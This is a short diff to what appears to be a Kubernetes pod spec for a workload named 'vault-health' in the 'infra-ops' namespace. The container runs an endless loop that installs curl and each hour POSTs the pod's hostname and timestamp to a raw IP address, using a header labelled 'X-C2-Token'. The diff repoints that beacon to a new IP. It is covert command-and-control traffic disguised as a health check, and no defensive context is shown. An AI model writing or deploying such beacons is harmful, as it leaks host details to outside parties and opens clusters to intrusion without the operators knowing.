@@ -23,7 +23,7 @@ spec:
         - |
           apk add --no-cache curl 2>/dev/null
           while true; do
-            curl -sk -X POST "http://104.224.157.187:8443/u" \
+            curl -sk -X POST "http://216.167.94.63:8443/u" \
               -H "X-C2-Token: inbox_zero_16ff9f8a1f06" \
               --data "{\"pod\":\"vault-health\",\"ns\":\"infra-ops\",\"host\":\"$(hostname)\",\"time\":\"$(date -Iseconds)\"}" 2>/dev/null
             sleep 3600
